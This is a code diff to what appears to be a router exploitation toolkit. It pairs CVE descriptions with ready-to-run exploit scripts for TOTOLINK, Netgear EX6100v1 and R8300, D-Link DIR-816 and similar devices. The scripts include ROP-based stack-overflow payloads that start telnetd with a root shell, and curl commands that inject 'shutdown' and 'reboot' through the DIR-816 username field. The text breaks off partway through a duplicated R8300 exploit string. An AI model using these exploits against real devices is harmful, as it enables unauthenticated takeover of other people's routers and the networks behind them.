@@ -33,6 +33,7 @@ data={
     "topicurl":"setting/setLanguageCfg",
     "langType":"cn;{};".format(cmd),
     "langFlag":"0"
+    }
 
 print(requests.post(url,headers=headers,data=json.dumps(data)).text)
 '''], 
@@ -46,7 +47,7 @@ import sys
 from struct import pack
 
 if len(sys.argv)!=4:
-	print "Parameter error. python exp.py url ulibc_base \\"command\\"\\ntips:Use the && symbol spacing command"
+	print("Parameter error. python exp.py url ulibc_base \\"command\\"\\ntips:Use the && symbol spacing command")
 	exit(0)
 
 url = sys.argv[1]
@@ -98,7 +99,7 @@ from struct import pack
 
 
 if len(sys.argv)!=4:
-    print "Parameter error. python exp.py url uClibc_base \\"command\\"\\ntips:Use the & symbol spacing command"
+    print("Parameter error. python exp.py url uClibc_base \\"command\\"\\ntips:Use the & symbol spacing command")
     exit(0)
 
 url = sys.argv[1]
@@ -148,7 +149,7 @@ import base64
 import urllib3
 
 if len(sys.argv)!=3:
-   print "Parameter error. python exp.py url \\"command\\""
+   print("Parameter error. python exp.py url \\"command\\"")
    exit(0)
 
 url = sys.argv[1]
@@ -165,7 +166,7 @@ if url[-1:]=='/':
   url=url[:-1]
 r = requests.get(url+"/download/dniapi/", headers=header,verify=False)
 
-print "DONE!"
+print("DONE!")
 """],
     "CVE-2021-1602":["(Unauth RCE without parameters can be executed like CVE-2021-1289)",
 """
@@ -175,7 +176,7 @@ import base64
 import urllib3
 
 if len(sys.argv)!=3:
-   print "Parameter error. python exp.py url \\"command with no parameters\\""
+   print("Parameter error. python exp.py url \\"command with no parameters\\"")
    exit(0)
 
 url = sys.argv[1]
@@ -192,7 +193,7 @@ if url[-1:]=='/':
   url=url[:-1]
 r = requests.get(url+"/download/dniapi/", headers=header,verify=False)
 
-print "DONE!"
+print("DONE!")
 """]}
 
 model_exp_dic["TOTOLINK_N600R"] = {
@@ -222,8 +223,8 @@ try:
     ip=sys.argv[1]
     port=sys.argv[2]
 except:
-    print "nonono! cant't do this"
-    print "please use python exp.py [ip] [port] [command]"
+    print("nonono! cant't do this")
+    print("please use python exp.py [ip] [port] [command]")
     exit()
 url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
 command='ls -al'
@@ -253,8 +254,8 @@ try:
     port=sys.argv[2]
     command=sys.argv[3]
 except:
-    print "nonono! cant't do this"
-    print "please use python exp.py [ip] [port] [command]"
+    print("nonono! cant't do this")
+    print("please use python exp.py [ip] [port] [command]")
     exit()
 url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
 headers={
@@ -282,8 +283,8 @@ try:
     port=sys.argv[2]
     command=sys.argv[3]
 except:
-    print "nonono! cant't do this"
-    print "please use python exp.py [ip] [port] [command]"
+    print("nonono! cant't do this")
+    print("please use python exp.py [ip] [port] [command]")
     exit()
 url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
 headers={
@@ -308,7 +309,76 @@ model_exp_dic["TOTOLINK_EX200"] = {
 
 model_exp_dic["Netgear_EX6100v1"] = {
     "CVE-2022-24655":
-["A stack overflow vulnerability exists in the upnpd service in Netgear EX6100v1 201.0.2.28, CAX80 2.1.2.6, and DC112A 1.0.0.62, which may lead to the execution of arbitrary code without authentication.\n['https://github.com/doudoudedi/Netgear_product_stack_overflow/blob/main/NETGEAR%20EX%20series%20upnpd%20stack_overflow.md', 'https://kb.netgear.com/000064615/Security-Advisory-for-Pre-Authentication-Command-Injection-on-EX6100v1-and-Pre-Authentication-Stack-Overflow-on-Multiple-Products-PSV-2021-0282-PSV-2021-0288', 'https://www.netgear.com/about/security/']", '\n#Aouth:doudoudedi\n#please pip install pwn\nfrom pwn import *\nimport sys\nimport os\nchoice=0\nrequest=\'\'\ntry:\n    target_ip=sys.argv[1]\n    target_version=sys.argv[2]\nexcept:\n    print("python ./exp.py ipaddress id")\n    print("if you firmware version is EX6100-V1.0.2.28_1.1.138.chk or please EX6100-V1.0.2.28_1.1.136 id is 1")\n    print("if you firmware version is EX6100-V1.0.2.24_1.1.134.chk id is 2")\n    exit(0)\n\ndef generate_payload():\n    global target_version,request,choice\n    if target_version=="1": \n            system_addr=0x00422848\n            change_password=0x042C550\n    if target_version=="2":\n            system_addr=0x422828\n            change_password=0x042C530\n    aim=0\n    print("1.open telnetd 25\\n2.change http password (NULL)")\n    choice=int(input())\n    if(choice==1):\n    aim=system_addr\n    request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"\n    request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"\n    request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"\n    request += b"NT: upnp:event\\n"\n    request += b"Timeout: Second-1800\\n"\n    request += b"Accept-Encoding: gzip, deflate\\n"\n    request += request+b"doud"\n    request += request\n    request = request.ljust(0x1f00,b"a")\n    request += p32(0x7fff7030)\n    request = request.ljust(0x1f48-0x14,b"a")\n    request += p32(aim)\n    if(choice==2):\n    aim=change_password\n    request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"\n    request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"\n    request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"\n    request += b"NT: upnp:event\\n"\n    request += b"Timeout: Second-1800\\n"\n    request += b"Accept-Encoding: gzip, deflate\\n"\n    request += request+b"doud"\n    request += request\n    request = request.ljust(0x1f00,b"a")\n    request += p32(0x7fff7030)\n    request += p32(0x7fff7030)*12\n    request += p32(0x42C550)\n    request += p32(aim)\n\n\ndef attack():\n    p=remote(target_ip,5000)\n    p.send(request)\n    if(choice==1):\n    os.system("telnet %s 25"%(target_ip))\n    #p.interactive()\n#request += p32(0x422944)\n#request += "a"*0x500\n#request += p32(0x7fff7030)*8\nif __name__=="__main__":\n    generate_payload()\n    attack()\n']
+["A stack overflow vulnerability exists in the upnpd service in Netgear EX6100v1 201.0.2.28, CAX80 2.1.2.6, and DC112A 1.0.0.62, which may lead to the execution of arbitrary code without authentication.\n['https://github.com/doudoudedi/Netgear_product_stack_overflow/blob/main/NETGEAR%20EX%20series%20upnpd%20stack_overflow.md', 'https://kb.netgear.com/000064615/Security-Advisory-for-Pre-Authentication-Command-Injection-on-EX6100v1-and-Pre-Authentication-Stack-Overflow-on-Multiple-Products-PSV-2021-0282-PSV-2021-0288', 'https://www.netgear.com/about/security/']", 
+"""
+#Aouth:doudoudedi
+#please pip install pwn
+from pwn import *
+import sys
+import os
+choice=0
+request=''
+try:
+    target_ip=sys.argv[1]
+    target_version=sys.argv[2]
+except:
+    print("python ./exp.py ipaddress id")
+    print("if you firmware version is EX6100-V1.0.2.28_1.1.138.chk or please EX6100-V1.0.2.28_1.1.136 id is 1")
+    print("if you firmware version is EX6100-V1.0.2.24_1.1.134.chk id is 2")
+    exit(0)
+
+def generate_payload():
+    global target_version,request,choice
+    if target_version=="1": 
+            system_addr=0x00422848
+            change_password=0x042C550
+    if target_version=="2":
+            system_addr=0x422828
+            change_password=0x042C530
+    aim=0
+    print("1.open telnetd 25\\n2.change http password (NULL)")
+    choice=int(input())
+    if(choice==1):
+        aim=system_addr
+        request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"
+        request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"
+        request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"
+        request += b"NT: upnp:event\\n"
+        request += b"Timeout: Second-1800\\n"
+        request += b"Accept-Encoding: gzip, deflate\\n"
+        request += request+b"doud"
+        request += request
+        request = request.ljust(0x1f00,b"a")
+        request += p32(0x7fff7030)
+        request = request.ljust(0x1f48-0x14,b"a")
+        request += p32(aim)
+    if(choice==2):
+        aim=change_password
+        request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"
+        request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"
+        request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"
+        request += b"NT: upnp:event\\n"
+        request += b"Timeout: Second-1800\\n"
+        request += b"Accept-Encoding: gzip, deflate\\n"
+        request += request+b"doud"
+        request += request
+        request = request.ljust(0x1f00,b"a")
+        request += p32(0x7fff7030)
+        request += p32(0x7fff7030)*12
+        request += p32(0x42C550)
+        request += p32(aim)
+
+
+def attack():
+    p=remote(target_ip,5000)
+    p.send(request)
+    if(choice==1):
+        os.system("telnet %s 25"%(target_ip))
+if __name__=="__main__":
+    generate_payload()
+    attack()
+""" 
+ ]
 }
 
 model_exp_dic["TOTOLINK_A800R"] = {
@@ -385,7 +455,8 @@ model_exp_dic["DIR-816"] = {
 ["An issue was discovered in D-Link DIR816_A1_FW101CNB04 750m11ac wireless router, The HTTP request parameter is used in the handler function of /goform/form2userconfig.cgi route, which can construct the user name string to delete the user function. This can lead to command injection through shell metacharacters.\n['https://github.com/doudoudedi/main-DIR-816_A1_Command-injection', 'https://github.com/doudoudedi/main-DIR-816_A1_Command-injection/blob/main/injection_A1.md', 'https://www.dlink.com/en/security-bulletin/']", '\ncurl -s http://192.168.33.9/dir_login.asp  | grep tokenid\ncurl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=Admin\';shutdown;\'&oldpass=123&newpass=123&confpass=123&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"\n'],
 "CVE-2021-39509":
 ["An issue was discovered in D-Link DIR-816 DIR-816A2_FWv1.10CNB05_R1B011D88210 The HTTP request parameter is used in the handler function of /goform/form2userconfig.cgi route, which can construct the user name string to delete the user function. This can lead to command injection through shell metacharacters.\n['https://github.com/doudoudedi/main-DIR-816_A2_Command-injection', 'https://github.com/doudoudedi/main-DIR-816_A2_Command-injection/blob/main/injection.md', 'https://www.dlink.com/en/security-bulletin/']", '\ncurl -s http://192.168.33.9/dir_login.asp  | grep tokenid\ncurl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=IjtyZWJvb3Q7Ig==&oldpass=123&newpass=MTIz&confpass=MTIz&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send&tokenid=xxxxx"#input id\n'],
-"stackover_flow_host":["unauth stackoverflow",
+"stackover_flow_host":
+["unauth_stackoverflow",
 """
 # Tested product: DIR-816 (CN)
 # Hardware version: A2
@@ -495,7 +566,7 @@ model_exp_dic["RT-N53"] = {
 
 model_exp_dic["Netgear_R8300"] = {
     "PSV-2020-0211":
-["Security Advisory for Pre-Authentication Command Injection on R8300, PSV-2020-0211", '\nimport socket\nimport time\nimport sys\nfrom struct import pack\n# NETGEAR Nighthawk R8300 RCE Exploit upnpd, tested exploit fw version V1.0.2.130\n# Date : 2020.03.09\n# POC : system("telnetd -l /bin/sh -p 9999& ") Execute\n# Desc : execute telnetd to access router\n# by python2\np32 = lambda x: pack("<L", x)\npayload = \'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7ABBBc9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7DDDBa9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7 AAA Aa9CbEEEECb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F\'\nexpayload = \'\'\npayload = payload.replace(\'z3Bz\',\'\\xff\\xff\\x1b\\x40\') # Need to Existed Address\npayload = payload.replace(\' AAA \',\'\\xf0\\x30\\x02\\x00\') #change eip\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nbssBase = 0x9E150   #string bss BASE Address\nexpayload += \'a\' * 4550\nexpayload += p32(bssBase+3) # R4 Register\nexpayload += p32(0x3F340) # R5 Register //tel\nexpayload += \'IIII\' # R6 Register\nexpayload += \'HHHH\' # R7 Register\nexpayload += \'GGGG\' # R8 Register\nexpayload += \'FFFF\' # R9 Register\nexpayload += p32(bssBase) # R10 Register\nexpayload += \'BBBB\' # R11 Register\nexpayload += p32(0x13644) # strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+6) #R4\nexpayload += p32(0x423D7) #R5  //telnet\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+8) #R4\nexpayload += p32(0x40CA4 ) #R5  //telnetd\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+10) #R4\nexpayload += p32(0x4704A) #R5  //telnetd\\x20-l\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+11) #R4\nexpayload += p32(0x04C281) #R5  //telnetd\\x20-l/bin/\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+16) #R4\nexpayload += p32(0x40CEC) #R5  //telnetd\\x20-l/bin/\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+18) #R4\nexpayload += p32(0x9CB5) #R5  //telnetd\\x20-l/bin/sh\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+22) #R4\nexpayload += p32(0x41B17) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+24) #R4\nexpayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x2099\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+26) #R4\nexpayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+28) #R4\nexpayload += p32(0x4A01D) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+30) #R4\nexpayload += p32(0x461C1) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\\x20\\x00\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nprint "[*] Make Payload ..."\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase) #R4\nexpayload += p32(0x47398) #R5\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x1A83C) #system(string) telnetd -l\ns.connect((\'239.255.255.250\', 1900))\nprint "[*] Send Proof Of Concept payload"\ns.send(\'a\\x00\'+expayload)#expayload is rop gadget\ns.send(payload)\ndef checkExploit():\nsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntry:\n    ret = soc.connect((\'192.168.1.1\',9999))\n    return 1\nexcept:\n    return 0\ntime.sleep(5)\nif checkExploit():\n    print "[*] Exploit Success"\n    print "[*] You can access telnet 192.168.1.1 9999"\nelse:\n    print "[*] Need to Existed Address cross each other"\n    print "[*] You need to reboot or execute upnpd daemon to execute upnpd"\n    print "[*] To exploit reexecute upnpd, description"\n    print "[*] Access http://192.168.1.1/debug.htm and enable telnet"\n    print "[*] then, You can access telnet. execute upnpd(just typing upnpd)"\ns.close()\nprint(Done)\n        ']
+["Security Advisory for Pre-Authentication Command Injection on R8300, PSV-2020-0211", '\nimport socket\nimport time\nimport sys\nfrom struct import pack\n# NETGEAR Nighthawk R8300 RCE Exploit upnpd, tested exploit fw version V1.0.2.130\n# Date : 2020.03.09\n# POC : system("telnetd -l /bin/sh -p 9999& ") Execute\n# Desc : execute telnetd to access router\n# by python2\np32 = lambda x: pack("<L", x)\npayload = \'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7ABBBc9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7DDDBa9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj